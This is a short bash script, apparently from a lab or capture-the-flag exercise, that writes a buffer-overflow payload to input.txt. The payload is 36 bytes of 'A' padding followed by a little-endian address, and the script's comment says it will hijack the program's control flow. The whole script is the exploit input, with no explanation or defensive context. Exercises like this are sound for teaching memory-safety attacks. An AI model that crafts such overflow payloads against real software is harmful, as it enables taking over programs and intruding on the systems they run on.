#!/bin/env bash

# This script generates an input that will hijack the program control flow.
printf "A%.0s" {1..36} > input.txt
echo -n -e "\x01\x89\x04\x08" >> input.txt
